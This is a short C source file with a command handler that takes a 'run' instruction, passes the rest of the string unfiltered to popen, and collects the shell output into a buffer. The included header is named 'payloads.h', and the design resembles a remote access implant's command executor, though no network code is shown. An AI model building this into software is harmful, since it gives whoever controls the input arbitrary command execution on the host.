#include "payloads.h"
int handleCommand(char *cmd, char *output_buffer)
{
    memset(output_buffer, 0, 1024);

    char *word = strtok(cmd, " ");
    if (word && strcmp(word, "run") == 0) // Safety: Check if word is NULL
    {
        char *command = strtok(NULL, "");
        if (command)
        {
            printf("Executing command: %s\n", command);
            FILE *fp = popen(command, "r");
            if (fp == NULL)
            {
                strcpy(output_buffer, "Error: Failed to run command");
                return ERROR;
            }

            char line_buffer[256]; // Temp buffer for one line
            int current_length = 0;
            while (fgets(line_buffer, sizeof(line_buffer), fp) != NULL)
            {
                int line_len = strlen(line_buffer);
                // Only append if we have space left
                if (current_length + line_len < 1023)
                {
                    // Copy directly to end address for better time complexity
                    memcpy(output_buffer + current_length, line_buffer, line_len);

                    current_length += line_len;
                    output_buffer[current_length] = '\0';
                }
            }
            // --- THE FIX END ---

            printf("%s", output_buffer); // Verify the full result
            pclose(fp);
        }
    }
    else
    {
        sprintf(output_buffer, "Unknown command: %s", word ? word : "NULL");
    }
    return TRUE;
}